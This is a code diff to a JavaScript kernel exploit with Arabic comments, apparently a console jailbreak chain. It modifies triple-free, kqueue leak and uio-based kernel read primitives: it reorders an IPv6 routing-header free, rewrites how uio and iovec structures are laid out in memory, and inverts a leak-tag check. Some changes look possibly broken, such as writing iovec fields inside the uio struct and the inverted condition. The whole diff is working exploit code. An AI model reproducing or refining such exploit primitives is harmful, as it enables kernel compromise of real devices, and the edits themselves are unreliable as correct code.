@@ -1420,12 +1420,12 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking kqueue...');
 
-    // 2) free مرة واحدة قبل اللوب
-  free_rthdr(ipv6_socks[triplets[1]]);
-
   // 1) صفّر الحقول اللي هتستخدمها
   write64(leak_rthdr.add(0x08), 0);  // magic
   write64(leak_rthdr.add(0x98), 0);  // fdp
+
+  // 2) free مرة واحدة قبل اللوب
+  free_rthdr(ipv6_socks[triplets[1]]);
 
   var MAX_KQ    = 4000;
   var magic_val = new BigInt(0x0, 0x1430000);
@@ -1496,22 +1496,15 @@ function kreadslow64_safe(address) {
   return read64(buffer);
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  //
-  // uio structure
-  //
-  write64(uio.add(0x00), uio_iov);      // uio_iov (pointer to iovec array)
-  write64(uio.add(0x08), UIO_IOV_NUM);  // uio_iovcnt
+  write64(uio.add(0x00), uio_iov); // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
   write64(uio.add(0x10), BigInt_Error); // uio_offset
-  write64(uio.add(0x18), size);         // uio_resid
+  write64(uio.add(0x18), size); // uio_resid
   write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
   write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
-  write64(uio.add(0x28), uio_td);       // uio_td
-
-  //
-  // iovec structure (MUST be written inside uio_iov, not inside uio)
-  //
-  write64(uio_iov.add(0x00), addr);     // iov_base
-  write64(uio_iov.add(0x08), size);     // iov_len
+  write64(uio.add(0x28), uio_td); // uio_td
+  write64(uio.add(0x30), addr); // iov_base
+  write64(uio.add(0x38), size); // iov_len
 }
 // =========================
 //  GLOBAL EXPLOIT CONSTANTS
@@ -1629,8 +1622,7 @@ function kreadslow(addr, size) {
   for (var k = 0; k < UIO_THREAD_NUM; k++) {
     read(new BigInt(uio_sock_0), leak_buffers[k], size);
     var val = read64(leak_buffers[k]);
-    if (val.eq(LEAK_TAG)) {
-      leak_buffer = leak_buffers[k].add(0);
+    if (!val.eq(LEAK_TAG)) {
       triplets[1] = find_triplet(triplets[0], -1);
       leak_buffer = leak_buffers[k].add(0);
     }
